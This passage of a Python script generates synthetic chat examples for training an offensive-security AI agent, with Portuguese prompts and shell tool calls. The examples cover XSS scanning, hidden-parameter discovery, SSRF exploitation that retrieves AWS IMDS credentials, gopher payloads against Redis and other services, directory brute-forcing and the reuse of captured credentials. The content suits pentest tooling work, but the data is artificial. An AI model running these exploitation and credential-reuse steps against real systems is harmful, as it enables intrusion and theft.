            tc("shell", cmd="sqlite3 ~/.bagley/engagements/current/memory.db \"\n"
                              "SELECT 'Hosts com portas mapeadas mas sem findings:' AS section;\n"
                              "SELECT DISTINCT h.ip FROM hosts h JOIN ports p ON h.ip=p.host\n"
                              "  WHERE h.ip NOT IN (SELECT DISTINCT host FROM findings);\n"
                              "SELECT 'Techniques ainda não tentadas em hosts-alvo:' AS section;\n"
                              "SELECT h.ip, 'kerberoast' FROM hosts h WHERE h.ip NOT IN\n"
                              "  (SELECT host FROM attempts WHERE technique='kerberoast');\n"
                              "\"")),
    ]


def er_priority_ranking() -> list[dict]:
    return [
        msg("user", "Ranking de prioridade dos hosts pelos findings atuais."),
        msg("assistant",
            tc("shell", cmd="sqlite3 memory.db \"\n"
                              "SELECT host, COUNT(*) as n_findings,\n"
                              "  SUM(CASE severity WHEN 'critical' THEN 10\n"
                              "                    WHEN 'high' THEN 5\n"
                              "                    WHEN 'medium' THEN 2 ELSE 1 END) as score\n"
                              "FROM findings GROUP BY host ORDER BY score DESC;\"")),
    ]


def er_creds_to_try() -> list[dict]:
    return [
        msg("user", "Quais creds eu já tenho válidas e onde ainda não usei?"),
        msg("assistant",
            tc("shell", cmd="sqlite3 memory.db \"\n"
                              "SELECT DISTINCT c.username || ':' || c.credential AS cred, c.service\n"
                              "FROM creds c WHERE c.validated=1;\n"
                              "-- Hosts where we haven't tried these:\n"
                              "SELECT DISTINCT h.ip FROM hosts h\n"
                              "WHERE h.ip NOT IN (SELECT host FROM attempts WHERE details LIKE '%<your-user>%');\"")),
    ]


ENGAGE_EXT = []
for _ in range(6):
    ENGAGE_EXT.append(er_whats_left())
for _ in range(5):
    ENGAGE_EXT.append(er_priority_ranking())
for _ in range(4):
    ENGAGE_EXT.append(er_creds_to_try())


# ===========================================================================
# Q. WEB TOOLS EXTENDED (+45)
# ===========================================================================

def wx_dalfox_xss(url: str) -> list[dict]:
    return [
        msg("user", f"XSS scan automatizado em {url}."),
        msg("assistant",
            tc("shell", cmd=f"dalfox url {url} --mining-dom --found-action 'echo confirmed: {{URL}}' --deep-domxss")),
    ]


def wx_arjun_params(url: str) -> list[dict]:
    return [
        msg("user", f"Descobre parâmetros hidden em {url}."),
        msg("assistant",
            tc("shell", cmd=f"arjun -u {url} -oT params.txt -m GET,POST --stable")),
        msg("tool", "[+] Valid parameter found: api_key\n[+] Valid parameter found: debug\n[+] Valid parameter found: bypass_auth"),
        msg("assistant", "`debug` e `bypass_auth` são suspicious — test esses primeiro. `debug=1` frequentemente expõe stack traces."),
    ]


def wx_waymore(domain: str) -> list[dict]:
    return [
        msg("user", f"Histórico super-completo de URLs em {domain}."),
        msg("assistant",
            "waymore agrega Wayback + Common Crawl + AlienVault OTX + URLScan.\n"
            + tc("shell", cmd=f"waymore -i {domain} -mode U -o waymore_{domain}.txt")),
    ]


def wx_ssrfmap(url: str, param: str) -> list[dict]:
    return [
        msg("user", f"SSRF confirmada em {url}?{param}=. Automatiza exploit."),
        msg("assistant",
            tc("shell", cmd=f"ssrfmap -r request.txt -p {param} -m portscan,readfiles,aws,gopher")),
        msg("tool", "[+] Module portscan — internal 192.168.1.1:8080 OPEN\n[+] Module aws — IMDSv1 token retrieved"),
        msg("assistant", "AWS creds via IMDSv1. Configure aws cli com as creds temporárias, enumera o account."),
    ]


def wx_gopherus_exploit(target_proto: str) -> list[dict]:
    return [
        msg("user", f"Gera gopher payload pra {target_proto} via SSRF."),
        msg("assistant",
            tc("shell", cmd=f"gopherus --exploit {target_proto}")),
        msg("tool", f"[+] Payload: gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset..."),
        msg("assistant", f"Codifica e injeta no SSRF endpoint. `{target_proto}` via gopher é particularmente poderoso porque nenhum proxy HTTP filtra o scheme."),
    ]


def wx_katana_headless(url: str) -> list[dict]:
    return [
        msg("user", f"SPA crawling em {url} — JS-heavy."),
        msg("assistant",
            tc("shell", cmd=f"katana -u {url} -hl -js-crawl -depth 4 -f qurl,path -silent | anew endpoints.txt")),
    ]


def wx_chaos_pd(domain: str) -> list[dict]:
    return [
        msg("user", f"ProjectDiscovery Chaos dataset pra {domain} — sem login."),
        msg("assistant",
            "Chaos do PD é público sem API key pra fetch via CLI.\n"
            + tc("shell", cmd=f"chaos -d {domain} -silent | anew {domain}.chaos.txt")),
    ]


def wx_shodan_cli() -> list[dict]:
    return [
        msg("user", "Shodan CLI queries úteis sem pagar."),
        msg("assistant",
            "Alguns features free sem credits:\n"
            "- `shodan host IP` — 1 request/day free\n"
            "- `shodan init <key>` — tier free com limite mensal\n\n"
            "Alternativa sem credits: manual web search via `https://www.shodan.io/host/IP` — rate-limited mas funcional."),
    ]


def wx_gau_pipeline(domain: str) -> list[dict]:
    return [
        msg("user", f"Full URL history pipeline pra {domain}."),
        msg("assistant",
            tc("shell", cmd=f"echo {domain} | gau --threads 20 | tee gau.txt | "
                              f"gf ssrf,xss,sqli,lfi,redirect,ssti,rce | sort -u > candidates.txt && "
                              f"wc -l gau.txt candidates.txt")),
    ]


def wx_feroxbuster(url: str) -> list[dict]:
    return [
        msg("user", f"Deep directory brute em {url} com recursion."),
        msg("assistant",
            tc("shell", cmd=f"feroxbuster -u {url} -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt "
                              f"-d 4 -t 50 -C 404 -s 200,301,302,401,403 --silent")),
    ]


def wx_cewl_wordlist(url: str) -> list[dict]:
    return [
        msg("user", f"Wordlist customizada baseada no conteúdo de {url}."),
        msg("assistant",
            tc("shell", cmd=f"cewl -d 3 -m 6 -w {url.replace('://','_').replace('/','_')}_cewl.txt {url}")),
    ]


WEB_TOOLS_EXT = []
_URLS = ["http://target.thm", "https://app.corp.com", "http://10.10.45.22", "http://10.10.11.42/search"]
_DOMS = ["acme.corp", "megacorp.thm", "target.hackingcompany.com"]
_PROTOS = ["redis", "mysql", "memcached", "smtp", "fastcgi"]

for url in _URLS:
    WEB_TOOLS_EXT.append(wx_dalfox_xss(url))
    WEB_TOOLS_EXT.append(wx_arjun_params(url))
    WEB_TOOLS_EXT.append(wx_katana_headless(url))
    WEB_TOOLS_EXT.append(wx_feroxbuster(url))
    WEB_TOOLS_EXT.append(wx_cewl_wordlist(url))
for d in _DOMS:
    WEB_TOOLS_EXT.append(wx_waymore(d))
    WEB_TOOLS_EXT.append(wx_chaos_pd(d))
    WEB_TOOLS_EXT.append(wx_gau_pipeline(d))
for url in _URLS[:3]:
    for p in ["url", "fetch", "target", "proxy"]:
        WEB_TOOLS_EXT.append(wx_ssrfmap(url, p))
for proto in _PROTOS:
    WEB_TOOLS_EXT.append(wx_gopherus_exploit(proto))
for _ in range(2):
    WEB_TOOLS_EXT.append(wx_shodan_cli())


# ===========================================================================
# Assembly
# ===========================================================================

ALL_V9_PLUS = {
    "report_writing": REPORT_WRITING,
    "container_k8s": CONTAINER_K8S,
    "supply_chain": SUPPLY_CHAIN,
    "defensive_awareness": DEFENSIVE,
    "pre_engagement": PRE_ENGAGE,
    "api_deep": API_DEEP,
    "adaptive_ext": ADAPT_EXT,
    "engagement_ext": ENGAGE_EXT,
    "web_tools_ext": WEB_TOOLS_EXT,
}


def counts():
    return {k: len(v) for k, v in ALL_V9_PLUS.items()}


if __name__ == "__main__":
    c = counts()
    total = sum(c.values())
    print("v9+ corpus (expansões):")
    for k, v in c.items():
        print(f"  {k:30s} {v}")
    print(f"  {'TOTAL':30s} {total}")
